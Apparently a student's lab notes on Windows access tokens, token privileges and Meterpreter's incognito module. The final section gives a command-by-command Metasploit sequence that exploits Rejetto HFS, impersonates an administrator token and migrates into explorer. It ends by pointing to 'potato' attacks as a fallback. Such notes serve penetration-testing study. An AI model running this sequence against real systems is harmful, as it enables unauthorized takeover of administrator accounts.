	• Windows Access Tokens
		○ core elemnt of authentication on windows crated and managed by Local security authority subsystem service LSASS
		○ A windows access token is responsible for identfiying and descriving the security context of a process or thread access token can be thought of as a temporay key like a cookie that provides users with access to a system or network wihtout having to provide credentials each time a process is started
		○ tokens are generated by the winlogon.exe process which included the idnetity and privleges of the user account this toeken is then attatched to userinit.exe after which all child processes started by a user will inherit a copy of the acces token from their createer and will run undre the pribleges of the same token
		○ Catgorized based onteh varying secuirty levels assigned to them these leves detriming the privleges assigned to a token
		○ an access token will typically be assinged one of the following security levels:
			§ impersonate-lvel tokens are created as a direct result of non-interactive login on windows typically through specific system services
			§ delegate-lvel toekns are typically created through an interactive login on windows primarily through a tradional login or through RDP or other remote access protocols
		○ impersonate level tokens can be used to impersonatate a token on the local system and not on any external systems
		○ delegate lvel tokens pose the largets threat as they can be used to impersonate tokens on any system
	• windows privileges
		○ the process of impersonating access tokens to elvate privleges on a system will priarily depnd on prvileges assigned to the account that has been exploited to gain initial access
		○ the following privliges are required for a succesfful impersonation attack
			§ seassign primary token: allows a user to impersonate tokens
			§ secreatetoken: this allows a user to create arbitrary token with admin privleges 
			§ seimpersonateprivilege: this allows a user to create a process under the security context of another user typically with admin privileges
	• the incognito module
		○ incognito module is built in meterpreter module that was originally a standalone applition that allows you to impersontate user tokens 
		○ we can use incognito module to display al ist off all available tokens we can impersonate
	1. service postgresql start && msfconsole
		a. search rejetto
			i. use 0 rejetto_hfs_exec
				1) set rhosts
					a) exploit
						i) load incognito 
							One. list_tokens -u
								First.  impersonate_token "attackdefense\administrator" 
									1. pgrep explorer
										1. migrate to explorer
if no token then you need to do a potato attack
